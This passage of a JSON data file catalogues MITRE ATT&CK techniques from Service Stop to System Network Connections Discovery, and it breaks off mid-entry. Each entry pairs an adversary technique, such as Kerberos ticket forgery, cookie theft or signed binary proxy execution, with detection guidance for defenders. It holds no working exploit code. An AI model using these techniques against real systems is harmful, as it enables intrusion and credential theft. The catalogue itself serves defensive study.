                    "Network Traffic: Network Traffic Flow",
                    "Application Log: Application Log Content"
                ],
                "detection": "Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1489",
                "name": "Service Stop",
                "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
                "url": "https://attack.mitre.org/techniques/T1489",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution",
                    "Service: Service Metadata",
                    "Windows Registry: Windows Registry Key Modification",
                    "File: File Modification",
                    "Process: Process Termination"
                ],
                "detection": "Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1129",
                "name": "Shared Modules",
                "description": "Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",
                "url": "https://attack.mitre.org/techniques/T1129",
                "data_sources": [
                    "Process: OS API Execution",
                    "Module: Module Load"
                ],
                "detection": "Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1051",
                "name": "Shared Webroot",
                "description": "**This technique has been deprecated and should no longer be used.**\n\nAdversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)",
                "url": "https://attack.mitre.org/techniques/T1051",
                "detection": "Use file and process monitoring to detect when files are written to a Web server by a process that is not the normal Web server process or when files are written outside of normal administrative time periods. Use process monitoring to identify normal processes that run on the Web server and detect processes that are not typically executed.",
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1218",
                "name": "Signed Binary Proxy Execution",
                "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.",
                "url": "https://attack.mitre.org/techniques/T1218",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Creation",
                    "Module: Module Load",
                    "Process: OS API Execution",
                    "Command: Command Execution",
                    "Windows Registry: Windows Registry Key Modification",
                    "Network Traffic: Network Connection Creation"
                ],
                "detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1216",
                "name": "Signed Script Proxy Execution",
                "description": "Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",
                "url": "https://attack.mitre.org/techniques/T1216",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Script: Script Execution"
                ],
                "detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1072",
                "name": "Software Deployment Tools",
                "description": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).\n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",
                "url": "https://attack.mitre.org/techniques/T1072",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Process: Process Creation"
                ],
                "detection": "Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "execution",
                    "lateral-movement"
                ]
            },
            {
                "id": "T1518",
                "name": "Software Discovery",
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
                "url": "https://attack.mitre.org/techniques/T1518",
                "data_sources": [
                    "Firewall: Firewall Metadata",
                    "Firewall: Firewall Enumeration",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1153",
                "name": "Source",
                "description": "**This technique has been deprecated and should no longer be used.**\n\nThe <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)\n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",
                "url": "https://attack.mitre.org/techniques/T1153",
                "detection": "Monitor for command shell execution of source and subsequent processes that are started as a result of being executed by a source command. Adversaries must also drop a file to disk in order to execute it with source, and these files can also detected by file monitoring.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1608",
                "name": "Stage Capabilities",
                "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities can also be staged on web services, such as GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",
                "url": "https://attack.mitre.org/techniques/T1608",
                "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1528",
                "name": "Steal Application Access Token",
                "description": "Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nAdversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "url": "https://attack.mitre.org/techniques/T1528",
                "data_sources": [
                    "User Account: User Account Modification"
                ],
                "detection": "Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a �High severity app permissions� policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\n\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app�s purpose, or apps with old �Last authorized� fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\n\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "SaaS",
                    "Office 365",
                    "Azure AD",
                    "Google Workspace"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1539",
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "url": "https://attack.mitre.org/techniques/T1539",
                "data_sources": [
                    "File: File Access",
                    "Process: Process Access"
                ],
                "detection": "Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1558",
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). \n\nKerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as �realms�, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.",
                "url": "https://attack.mitre.org/techniques/T1558",
                "data_sources": [
                    "Active Directory: Active Directory Credential Request",
                    "Logon Session: Logon Session Metadata"
                ],
                "detection": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1553",
                "name": "Subvert Trust Controls",
                "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ",
                "url": "https://attack.mitre.org/techniques/T1553",
                "data_sources": [
                    "Windows Registry: Windows Registry Key Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Metadata",
                    "File: File Modification",
                    "Module: Module Load"
                ],
                "detection": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) \n\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. ",
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1195",
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)",
                "url": "https://attack.mitre.org/techniques/T1195",
                "detection": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1082",
                "name": "System Information Discovery",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
                "url": "https://attack.mitre.org/techniques/T1082",
                "data_sources": [
                    "Instance: Instance Metadata",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1614",
                "name": "System Location Discovery",
                "description": "\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",
                "url": "https://attack.mitre.org/techniques/T1614",
                "data_sources": [
                    "Instance: Instance Metadata",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information.(Citation: FBI Ragnar Locker 2020)\n\nMonitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "IaaS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1016",
                "name": "System Network Configuration Discovery",
                "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "url": "https://attack.mitre.org/techniques/T1016",
                "data_sources": [
                    "Process: Process Creation",
                    "Script: Script Execution",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1049",
                "name": "System Network Connections Discovery",
                "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".",
                "url": "https://attack.mitre.org/techniques/T1049",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1033",
                "name": "System Owner/User Discovery",
